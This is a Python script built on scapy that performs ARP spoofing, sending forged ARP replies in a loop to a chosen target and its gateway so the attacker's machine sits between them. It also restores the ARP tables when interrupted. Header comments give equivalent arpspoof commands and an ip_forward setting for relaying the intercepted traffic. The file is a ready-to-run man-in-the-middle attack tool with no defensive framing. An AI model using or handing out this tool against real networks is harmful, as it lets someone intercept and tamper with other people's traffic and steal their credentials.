# arpspoof -i <interface> -t <router><victim>
# arpspoof -i <interface> -t <victim><router>
# two commands, one to fool the router and one for the client
# echo 1 >/proc/sys/net/ipv4/ip_forward
# make the packet pass through
import sys

import scapy.all as scapy
import time
import argparse


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
    mac = answered_list[0][1].hwsrc
    return mac


def spoof(target_ip, spoof_ip, target_mac):
    # the src mac will be the one of the attacker machine.
    # The ip of the gateway will be associated with the attacker mac
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip),
                       psrc=source_ip, hwsrc=get_mac(source_ip))
    # send the packet 4 times just to be sure that the mac are restored
    scapy.send(packet, count=4, verbose=False)


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP address")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP address")
    options = parser.parse_args()
    return options


if __name__ == "__main__":

    options = get_arguments()
    target_ip = options.target
    gateway_ip = options.gateway

    sent_packet_count = 0
    try:
        while True:
            spoof(target_ip, gateway_ip, get_mac(target_ip))
            spoof(gateway_ip, target_ip, get_mac(gateway_ip))
            sent_packet_count += 2
            print("\r[+] Packet sent: " + str(sent_packet_count), end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-] Detected CTRL + C ..... Quitting.")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
